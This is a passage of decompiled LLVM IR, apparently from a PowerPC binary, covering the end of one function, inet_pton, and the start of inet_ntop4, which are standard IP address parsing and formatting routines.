  %v2_1000ebe4 = icmp ugt i32 %v1_1000ebe0, 9
  store i1 %v2_1000ebe4, i1* %cr6_gt.global-to-local, align 1
  %v3_1000ebe8 = icmp eq i8 %v2_1000ebd0, 46
  store i1 %v3_1000ebe8, i1* %cr1_eq.global-to-local, align 1
  %v0_1000ebec = load i4, i4* @cr4, align 1
  %v1_1000ebec = call %2 @__asm_mcrf_cr0_write(i4 %v0_1000ebec)
  %v4_1000ebec = extractvalue %2 %v1_1000ebec, 2
  store i1 %v4_1000ebec, i1* %cr0_eq.global-to-local, align 1
  %v0_1000ebf0 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_1000ebf4 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_1000ebf0, label %dec_label_pc_1000ebf4, label %dec_label_pc_1000eb80

dec_label_pc_1000ebf4:                            ; preds = %dec_label_pc_1000ebd0
  %v3_1000ebf4 = icmp eq i32 %v0_1000ebf4, 3
  store i1 %v3_1000ebf4, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_1000ebf4, 4
  br i1 %tmp9, label %dec_label_pc_1000ec18, label %dec_label_pc_1000ebfc

dec_label_pc_1000ebfc:                            ; preds = %dec_label_pc_1000ebf4
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1000eb64, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ec0c.399 to i32), i32* @lr, align 4
  %v0_1000ec08 = call i32 @memcpy()
  br label %dec_label_pc_1000ec18

dec_label_pc_1000ec18:                            ; preds = %dec_label_pc_1000ebbc, %dec_label_pc_1000eb88, %dec_label_pc_1000eba8, %dec_label_pc_1000ebf4, %dec_label_pc_1000ebfc
  %storemerge = phi i32 [ 1, %dec_label_pc_1000ebfc ], [ 0, %dec_label_pc_1000ebf4 ], [ 0, %dec_label_pc_1000eba8 ], [ 0, %dec_label_pc_1000eb88 ], [ 0, %dec_label_pc_1000ebbc ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_1000eb68, i32* %r0.global-to-local, align 4
  %v1_1000ec28 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000eb58)
  %v4_1000ec28 = extractvalue %0 %v1_1000ec28, 2
  store i1 %v4_1000ec28, i1* %cr0_eq.global-to-local, align 1
  %v9_1000ec28 = extractvalue %0 %v1_1000ec28, 7
  store i4 %v9_1000ec28, i4* @cr4, align 1
  %v0_1000ec2c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ec2c

; uselistorder directives
  uselistorder i32 %v1_1000eba8, { 1, 0, 2 }
  uselistorder i32 %v1_1000eb94, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000eb58, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 7, 8, 9, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000ec18, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ebd0.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1000ec30 = icmp eq i32 %arg1, 2
  %v0_1000ec34 = load i32, i32* @lr, align 4
  store i32 %v0_1000ec34, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_1000ec30, label %dec_label_pc_1000ec5c, label %dec_label_pc_1000ec50

dec_label_pc_1000ec50:                            ; preds = %entry
  %v3_1000ec50 = icmp eq i32 %arg1, 10
  br i1 %v3_1000ec50, label %dec_label_pc_1000ec70, label %dec_label_pc_1000ee0c

dec_label_pc_1000ec5c:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268495976, i32* @lr, align 4
  %v3_1000ec64 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_1000ec64, i32* %r3.global-to-local, align 4
  store i32 %v3_1000ec64, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ee24

dec_label_pc_1000ec70:                            ; preds = %dec_label_pc_1000ec50
  %v2_1000ec70 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000ec70, i32* %r3.global-to-local, align 4
  store i32 268496000, i32* @lr, align 4
  %v3_1000ec7c = call i32 @__GI_memset(i32 %v2_1000ec70, i32 0, i32 16)
  store i32 %v3_1000ec7c, i32* %r3.global-to-local, align 4
  %v0_1000ec80 = load i32, i32* @r29, align 4
  %v1_1000ec80 = inttoptr i32 %v0_1000ec80 to i8*
  %v2_1000ec80 = load i8, i8* %v1_1000ec80, align 1
  %v3_1000ec80 = zext i8 %v2_1000ec80 to i32
  store i32 %v3_1000ec80, i32* %r0.global-to-local, align 4
  store i32 %v3_1000ec7c, i32* @r31, align 4
  %v2_1000ec88 = add i32 %v3_1000ec7c, 16
  store i32 %v2_1000ec88, i32* @r27, align 4
  %v3_1000ec8c = icmp eq i8 %v2_1000ec80, 58
  br i1 %v3_1000ec8c, label %dec_label_pc_1000ec94, label %dec_label_pc_1000eca0

dec_label_pc_1000ec94:                            ; preds = %dec_label_pc_1000ec70
  %v1_1000ec94 = add i32 %v0_1000ec80, 1
  %v2_1000ec94 = inttoptr i32 %v1_1000ec94 to i8*
  %v3_1000ec94 = load i8, i8* %v2_1000ec94, align 1
  %v4_1000ec94 = zext i8 %v3_1000ec94 to i32
  store i32 %v4_1000ec94, i32* %r0.global-to-local, align 4
  store i32 %v1_1000ec94, i32* @r29, align 4
  %v3_1000ec98 = icmp eq i8 %v3_1000ec94, 58
  br i1 %v3_1000ec98, label %dec_label_pc_1000eca0, label %dec_label_pc_1000ee20

dec_label_pc_1000eca0:                            ; preds = %dec_label_pc_1000ec94, %dec_label_pc_1000ec70
  %v0_1000eca0 = phi i32 [ %v1_1000ec94, %dec_label_pc_1000ec94 ], [ %v0_1000ec80, %dec_label_pc_1000ec70 ]
  store i32 %v0_1000eca0, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000ed743036 = inttoptr i32 %v0_1000eca0 to i8*
  %v2_1000ed743137 = load i8, i8* %v1_1000ed743036, align 1
  %v3_1000ed743238 = zext i8 %v2_1000ed743137 to i32
  store i32 %v3_1000ed743238, i32* %r3.global-to-local, align 4
  store i32 268496252, i32* @lr, align 4
  %v1_1000ed783339 = call i32 @__GI_tolower(i32 %v3_1000ed743238)
  store i32 %v1_1000ed783339, i32* %r3.global-to-local, align 4
  store i32 %v1_1000ed783339, i32* @r30, align 4
  %v3_1000ed7c3440 = icmp eq i32 %v1_1000ed783339, 0
  br i1 %v3_1000ed7c3440, label %dec_label_pc_1000ed84, label %dec_label_pc_1000ecac.lr.ph

dec_label_pc_1000ecac:                            ; preds = %dec_label_pc_1000ecac.lr.ph, %dec_label_pc_1000ed74.backedge
  %v1_1000ed7835 = phi i32 [ %v1_1000ed783341, %dec_label_pc_1000ecac.lr.ph ], [ %v1_1000ed78, %dec_label_pc_1000ed74.backedge ]
  store i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10012b60.400 to i32), i32* @r25, align 4
  %v0_1000ecb8 = load i32, i32* @r29, align 4
  %v1_1000ecb8 = add i32 %v0_1000ecb8, 1
  store i32 %v1_1000ecb8, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10012b60.400 to i32), i32* @r3, align 4
  store i32 268496068, i32* @lr, align 4
  %v3_1000ecc0 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_10012b60.400 to i32), i32 %v1_1000ed7835)
  store i32 %v3_1000ecc0, i32* %r3.global-to-local, align 4
  %v3_1000ecc4 = icmp eq i32 %v3_1000ecc0, 0
  br i1 %v3_1000ecc4, label %dec_label_pc_1000ece4, label %dec_label_pc_1000eccc

dec_label_pc_1000eccc:                            ; preds = %dec_label_pc_1000ecac
  %v0_1000eccc = load i32, i32* @r25, align 4
  %v2_1000eccc = sub i32 %v3_1000ecc0, %v0_1000eccc
  store i32 %v2_1000eccc, i32* %r0.global-to-local, align 4
  %v0_1000ecd0 = load i32, i32* @r28, align 4
  %v1_1000ecd0 = mul i32 %v0_1000ecd0, 16
  store i32 %v1_1000ecd0, i32* %r9.global-to-local, align 4
  %v2_1000ecd4 = or i32 %v1_1000ecd0, %v2_1000eccc
  store i32 %v2_1000ecd4, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_1000ecd4, 65536
  br i1 %tmp19, label %dec_label_pc_1000ed70, label %dec_label_pc_1000ee20

dec_label_pc_1000ece4:                            ; preds = %dec_label_pc_1000ecac
  %v0_1000ece4 = load i32, i32* @r30, align 4
  %v3_1000ece4 = icmp eq i32 %v0_1000ece4, 58
  br i1 %v3_1000ece4, label %dec_label_pc_1000ecec, label %dec_label_pc_1000ed40

dec_label_pc_1000ecec:                            ; preds = %dec_label_pc_1000ece4
  %v0_1000ecec = load i32, i32* @r23, align 4
  %v3_1000ecec = icmp eq i32 %v0_1000ecec, 0
  br i1 %v3_1000ecec, label %dec_label_pc_1000ecf4, label %dec_label_pc_1000ed08

dec_label_pc_1000ecf4:                            ; preds = %dec_label_pc_1000ecec
  %v0_1000ecf4 = load i32, i32* @r24, align 4
  %v3_1000ecf4 = icmp eq i32 %v0_1000ecf4, 0
  br i1 %v3_1000ecf4, label %dec_label_pc_1000ecfc, label %dec_label_pc_1000ee20

dec_label_pc_1000ecfc:                            ; preds = %dec_label_pc_1000ecf4
  %v0_1000ecfc = load i32, i32* @r31, align 4
  store i32 %v0_1000ecfc, i32* @r24, align 4
  %v0_1000ed00 = load i32, i32* @r29, align 4
  store i32 %v0_1000ed00, i32* @r26, align 4
  br label %dec_label_pc_1000ed74.backedge

dec_label_pc_1000ed08:                            ; preds = %dec_label_pc_1000ecec
  %v0_1000ed08 = load i32, i32* @r29, align 4
  %v1_1000ed08 = inttoptr i32 %v0_1000ed08 to i8*
  %v2_1000ed08 = load i8, i8* %v1_1000ed08, align 1
  %v3_1000ed08 = zext i8 %v2_1000ed08 to i32
  store i32 %v3_1000ed08, i32* %r0.global-to-local, align 4
  %v3_1000ed0c = icmp eq i8 %v2_1000ed08, 0
  br i1 %v3_1000ed0c, label %dec_label_pc_1000ee20, label %dec_label_pc_1000ed14

dec_label_pc_1000ed14:                            ; preds = %dec_label_pc_1000ed08
  %v0_1000ed14 = load i32, i32* @r31, align 4
  %v1_1000ed14 = add i32 %v0_1000ed14, 2
  store i32 %v1_1000ed14, i32* %r0.global-to-local, align 4
  %v1_1000ed18 = load i32, i32* @r27, align 4
  %v3_1000ed18 = icmp ugt i32 %v1_1000ed14, %v1_1000ed18
  br i1 %v3_1000ed18, label %dec_label_pc_1000ee20, label %dec_label_pc_1000ed20

dec_label_pc_1000ed20:                            ; preds = %dec_label_pc_1000ed14
  %v0_1000ed20 = load i32, i32* @r28, align 4
  %v1_1000ed20 = udiv i32 %v0_1000ed20, 256
  store i32 %v1_1000ed20, i32* %r0.global-to-local, align 4
  %v1_1000ed24 = trunc i32 %v0_1000ed20 to i8
  %v3_1000ed24 = add i32 %v0_1000ed14, 1
  %v4_1000ed24 = inttoptr i32 %v3_1000ed24 to i8*
  store i8 %v1_1000ed24, i8* %v4_1000ed24, align 1
  %v0_1000ed28 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ed28 = trunc i32 %v0_1000ed28 to i8
  %v2_1000ed28 = load i32, i32* @r31, align 4
  %v3_1000ed28 = inttoptr i32 %v2_1000ed28 to i8*
  store i8 %v1_1000ed28, i8* %v3_1000ed28, align 1
  %v0_1000ed2c = load i32, i32* @r29, align 4
  store i32 %v0_1000ed2c, i32* @r26, align 4
  %v0_1000ed30 = load i32, i32* @r31, align 4
  %v1_1000ed30 = add i32 %v0_1000ed30, 2
  store i32 %v1_1000ed30, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000ed7430 = inttoptr i32 %v0_1000ed2c to i8*
  %v2_1000ed7431 = load i8, i8* %v1_1000ed7430, align 1
  %v3_1000ed7432 = zext i8 %v2_1000ed7431 to i32
  store i32 %v3_1000ed7432, i32* %r3.global-to-local, align 4
  store i32 268496252, i32* @lr, align 4
  %v1_1000ed7833 = call i32 @__GI_tolower(i32 %v3_1000ed7432)
  store i32 %v1_1000ed7833, i32* %r3.global-to-local, align 4
  store i32 %v1_1000ed7833, i32* @r30, align 4
  %v3_1000ed7c34 = icmp eq i32 %v1_1000ed7833, 0
  br i1 %v3_1000ed7c34, label %dec_label_pc_1000ed84, label %dec_label_pc_1000ecac.lr.ph

dec_label_pc_1000ecac.lr.ph:                      ; preds = %dec_label_pc_1000eca0, %dec_label_pc_1000ed20
  %v1_1000ed783341 = phi i32 [ %v1_1000ed7833, %dec_label_pc_1000ed20 ], [ %v1_1000ed783339, %dec_label_pc_1000eca0 ]
  br label %dec_label_pc_1000ecac

dec_label_pc_1000ed40:                            ; preds = %dec_label_pc_1000ece4
  %v3_1000ed40 = icmp eq i32 %v0_1000ece4, 46
  br i1 %v3_1000ed40, label %dec_label_pc_1000ed48, label %dec_label_pc_1000ee20

dec_label_pc_1000ed48:                            ; preds = %dec_label_pc_1000ed40
  %v0_1000ed48 = load i32, i32* @r31, align 4
  %v1_1000ed48 = add i32 %v0_1000ed48, 4
  store i32 %v1_1000ed48, i32* @r30, align 4
  %v1_1000ed4c = load i32, i32* @r27, align 4
  %v3_1000ed4c = icmp ugt i32 %v1_1000ed48, %v1_1000ed4c
  br i1 %v3_1000ed4c, label %dec_label_pc_1000ee20, label %dec_label_pc_1000ed54

dec_label_pc_1000ed54:                            ; preds = %dec_label_pc_1000ed48
  %v0_1000ed58 = load i32, i32* @r26, align 4
  store i32 %v0_1000ed58, i32* %r3.global-to-local, align 4
  store i32 268496224, i32* @lr, align 4
  %v3_1000ed5c = call i32 @inet_pton4(i32 %v0_1000ed58, i32 %v0_1000ed48)
  store i32 %v3_1000ed5c, i32* %r3.global-to-local, align 4
  %v0_1000ed60 = load i32, i32* @r30, align 4
  store i32 %v0_1000ed60, i32* @r31, align 4
  %v2_1000ed64 = icmp sgt i32 %v3_1000ed5c, 0
  br i1 %v2_1000ed64, label %dec_label_pc_1000eda8, label %dec_label_pc_1000ee20

dec_label_pc_1000ed70:                            ; preds = %dec_label_pc_1000eccc
  store i32 1, i32* @r23, align 4
  %v0_1000ed74.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ed74.backedge

dec_label_pc_1000ed74.backedge:                   ; preds = %dec_label_pc_1000ed70, %dec_label_pc_1000ecfc
  %v0_1000ed74.be = phi i32 [ %v0_1000ed74.pre.pre, %dec_label_pc_1000ed70 ], [ %v0_1000ed00, %dec_label_pc_1000ecfc ]
  %v1_1000ed74 = inttoptr i32 %v0_1000ed74.be to i8*
  %v2_1000ed74 = load i8, i8* %v1_1000ed74, align 1
  %v3_1000ed74 = zext i8 %v2_1000ed74 to i32
  store i32 %v3_1000ed74, i32* %r3.global-to-local, align 4
  store i32 268496252, i32* @lr, align 4
  %v1_1000ed78 = call i32 @__GI_tolower(i32 %v3_1000ed74)
  store i32 %v1_1000ed78, i32* %r3.global-to-local, align 4
  store i32 %v1_1000ed78, i32* @r30, align 4
  %v3_1000ed7c = icmp eq i32 %v1_1000ed78, 0
  br i1 %v3_1000ed7c, label %dec_label_pc_1000ed84, label %dec_label_pc_1000ecac

dec_label_pc_1000ed84:                            ; preds = %dec_label_pc_1000ed74.backedge, %dec_label_pc_1000eca0, %dec_label_pc_1000ed20
  %v0_1000ed84 = load i32, i32* @r23, align 4
  %v3_1000ed84 = icmp eq i32 %v0_1000ed84, 0
  %v0_1000edec.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000ed84, label %dec_label_pc_1000eda8, label %dec_label_pc_1000ed8c

dec_label_pc_1000ed8c:                            ; preds = %dec_label_pc_1000ed84
  %v1_1000ed8c = add i32 %v0_1000edec.pre.pre, 2
  store i32 %v1_1000ed8c, i32* %r0.global-to-local, align 4
  %v1_1000ed90 = load i32, i32* @r27, align 4
  %v3_1000ed90 = icmp ugt i32 %v1_1000ed8c, %v1_1000ed90
  br i1 %v3_1000ed90, label %dec_label_pc_1000ee20, label %dec_label_pc_1000ed98

dec_label_pc_1000ed98:                            ; preds = %dec_label_pc_1000ed8c
  %v0_1000ed98 = load i32, i32* @r28, align 4
  %v1_1000ed98 = udiv i32 %v0_1000ed98, 256
  store i32 %v1_1000ed98, i32* %r0.global-to-local, align 4
  %v1_1000ed9c = trunc i32 %v0_1000ed98 to i8
  %v3_1000ed9c = add i32 %v0_1000edec.pre.pre, 1
  %v4_1000ed9c = inttoptr i32 %v3_1000ed9c to i8*
  store i8 %v1_1000ed9c, i8* %v4_1000ed9c, align 1
  %v0_1000eda0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000eda0 = trunc i32 %v0_1000eda0 to i8
  %v2_1000eda0 = load i32, i32* @r31, align 4
  %v3_1000eda0 = inttoptr i32 %v2_1000eda0 to i8*
  store i8 %v1_1000eda0, i8* %v3_1000eda0, align 1
  %v0_1000eda4 = load i32, i32* @r31, align 4
  %v1_1000eda4 = add i32 %v0_1000eda4, 2
  store i32 %v1_1000eda4, i32* @r31, align 4
  br label %dec_label_pc_1000eda8

dec_label_pc_1000eda8:                            ; preds = %dec_label_pc_1000ed84, %dec_label_pc_1000ed54, %dec_label_pc_1000ed98
  %v0_1000edec.pre = phi i32 [ %v0_1000ed60, %dec_label_pc_1000ed54 ], [ %v1_1000eda4, %dec_label_pc_1000ed98 ], [ %v0_1000edec.pre.pre, %dec_label_pc_1000ed84 ]
  %v0_1000eda8 = load i32, i32* @r24, align 4
  %v3_1000eda8 = icmp eq i32 %v0_1000eda8, 0
  %v1_1000edec.pre = load i32, i32* @r27, align 4
  %v4_1000edec = icmp eq i32 %v0_1000edec.pre, %v1_1000edec.pre
  br i1 %v3_1000eda8, label %dec_label_pc_1000edec, label %dec_label_pc_1000edb0

dec_label_pc_1000edb0:                            ; preds = %dec_label_pc_1000eda8
  %v2_1000edb4 = sub i32 %v0_1000edec.pre, %v0_1000eda8
  store i32 %v2_1000edb4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_1000edec, label %dec_label_pc_1000ee20, label %dec_label_pc_1000edd4.preheader

dec_label_pc_1000edd4.preheader:                  ; preds = %dec_label_pc_1000edb0
  %v3_1000edd424 = icmp slt i32 %v2_1000edb4, 1
  %v2_1000edd826 = add i32 %v2_1000edb4, -1
  store i32 %v2_1000edd826, i32* %r10.global-to-local, align 4
  %v2_1000eddc27 = add i32 %v1_1000edec.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1000edd424, label %dec_label_pc_1000edec.thread, label %dec_label_pc_1000edc8

dec_label_pc_1000edc8:                            ; preds = %dec_label_pc_1000edd4.preheader, %dec_label_pc_1000edc8.dec_label_pc_1000edc8_crit_edge
  %v0_1000edc8 = phi i32 [ %v0_1000edc8.pre, %dec_label_pc_1000edc8.dec_label_pc_1000edc8_crit_edge ], [ %v0_1000eda8, %dec_label_pc_1000edd4.preheader ]
  %v2_1000eddc29 = phi i32 [ %v2_1000eddc, %dec_label_pc_1000edc8.dec_label_pc_1000edc8_crit_edge ], [ %v2_1000eddc27, %dec_label_pc_1000edd4.preheader ]
  %v2_1000edd828 = phi i32 [ %v2_1000edd8, %dec_label_pc_1000edc8.dec_label_pc_1000edc8_crit_edge ], [ %v2_1000edd826, %dec_label_pc_1000edd4.preheader ]
  %v2_1000edc8 = add i32 %v0_1000edc8, %v2_1000edd828
  %v3_1000edc8 = inttoptr i32 %v2_1000edc8 to i8*
  %v4_1000edc8 = load i8, i8* %v3_1000edc8, align 1
  %v5_1000edc8 = zext i8 %v4_1000edc8 to i32
  store i32 %v5_1000edc8, i32* %r0.global-to-local, align 4
  %v3_1000edcc = inttoptr i32 %v2_1000eddc29 to i8*
  store i8 %v4_1000edc8, i8* %v3_1000edcc, align 1
  %v0_1000edd0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000edd0 = load i32, i32* @r24, align 4
  %v2_1000edd0 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000edd0 = trunc i32 %v0_1000edd0 to i8
  %v4_1000edd0 = add i32 %v2_1000edd0, %v1_1000edd0
  %v5_1000edd0 = inttoptr i32 %v4_1000edd0 to i8*
  store i8 %v3_1000edd0, i8* %v5_1000edd0, align 1
  %v0_1000edd4.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000edd4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1000eddc.pre = load i32, i32* @r27, align 4
  %v3_1000edd4 = icmp slt i32 %v1_1000edd4.pre, %v0_1000edd4.pre
  %v2_1000edd8 = sub i32 %v1_1000edd4.pre, %v0_1000edd4.pre
  store i32 %v2_1000edd8, i32* %r10.global-to-local, align 4
  %v1_1000ede0 = add i32 %v0_1000edd4.pre, 1
  store i32 %v1_1000ede0, i32* %r9.global-to-local, align 4
  br i1 %v3_1000edd4, label %dec_label_pc_1000edec.thread, label %dec_label_pc_1000edc8.dec_label_pc_1000edc8_crit_edge

dec_label_pc_1000edc8.dec_label_pc_1000edc8_crit_edge: ; preds = %dec_label_pc_1000edc8
  %v2_1000eddc = sub i32 %v1_1000eddc.pre, %v0_1000edd4.pre
  %v0_1000edc8.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1000edc8

dec_label_pc_1000edec.thread:                     ; preds = %dec_label_pc_1000edc8, %dec_label_pc_1000edd4.preheader
  %v0_1000ede8.lcssa = phi i32 [ %v1_1000edec.pre, %dec_label_pc_1000edd4.preheader ], [ %v1_1000eddc.pre, %dec_label_pc_1000edc8 ]
  store i32 %v0_1000ede8.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1000edf4

dec_label_pc_1000edec:                            ; preds = %dec_label_pc_1000eda8
  br i1 %v4_1000edec, label %dec_label_pc_1000edf4, label %dec_label_pc_1000ee20

dec_label_pc_1000edf4:                            ; preds = %dec_label_pc_1000edec.thread, %dec_label_pc_1000edec
  %v0_1000edf4 = load i32, i32* @r22, align 4
  store i32 %v0_1000edf4, i32* @r3, align 4
  store i32 %v2_1000ec70, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ee04.401 to i32), i32* @lr, align 4
  %v0_1000ee00 = call i32 @memcpy()
  store i32 %v0_1000ee00, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ee24

dec_label_pc_1000ee0c:                            ; preds = %dec_label_pc_1000ec50
  %v0_1000ee0c = call i32 @__errno_location()
  store i32 %v0_1000ee0c, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ee18 = inttoptr i32 %v0_1000ee0c to i32*
  store i32 97, i32* %v2_1000ee18, align 4
  %v0_1000ee28.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ee24

dec_label_pc_1000ee20:                            ; preds = %dec_label_pc_1000ed14, %dec_label_pc_1000ed08, %dec_label_pc_1000eccc, %dec_label_pc_1000ecf4, %dec_label_pc_1000edb0, %dec_label_pc_1000ed54, %dec_label_pc_1000ed40, %dec_label_pc_1000edec, %dec_label_pc_1000ec94, %dec_label_pc_1000ed8c, %dec_label_pc_1000ed48
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ee24

dec_label_pc_1000ee24:                            ; preds = %dec_label_pc_1000edf4, %dec_label_pc_1000ec5c, %dec_label_pc_1000ee0c, %dec_label_pc_1000ee20
  %v0_1000ee28 = phi i32 [ 1, %dec_label_pc_1000edf4 ], [ %v3_1000ec64, %dec_label_pc_1000ec5c ], [ %v0_1000ee28.pre, %dec_label_pc_1000ee0c ], [ 0, %dec_label_pc_1000ee20 ]
  store i32 %v0_1000ec34, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ee28, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ee28

; uselistorder directives
  uselistorder i32 %v0_1000ee28, { 1, 0 }
  uselistorder i32 %v2_1000edd8, { 1, 0 }
  uselistorder i32 %v0_1000edd4.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1000edec, { 1, 0 }
  uselistorder i32 %v0_1000edec.pre, { 1, 0 }
  uselistorder i32 %v0_1000ed98, { 1, 0 }
  uselistorder i32 %v0_1000edec.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000ed78, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000ed20, { 1, 0 }
  uselistorder i32 %v1_1000ecd0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 8, 9, 10, 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 18, 5, 6, 7, 8, 12, 13, 9, 10, 2, 1, 11, 4, 3, 14, 15, 16, 17, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268496252, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ee24, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ee20, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1000edf4, { 1, 0 }
  uselistorder label %dec_label_pc_1000edc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000eda8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ed84, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ecac.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000ecac, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000ee94.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_1000ee3c = load i32, i32* @lr, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_1000ee68 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1000ee68, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1000ee78.404 to i32), i32* @lr, align 4
  %v3_1000ee74 = call i32 @__GI_memset(i32 %v2_1000ee68, i32 0, i32 15)
  store i32 %v3_1000ee74, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1000ef382 = load i32, i32* @r1, align 4
  store i32 %v0_1000ef382, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ee94

dec_label_pc_1000ee94:                            ; preds = %dec_label_pc_1000ef08.dec_label_pc_1000ee94_crit_edge, %dec_label_pc_1000ee94.lr.ph
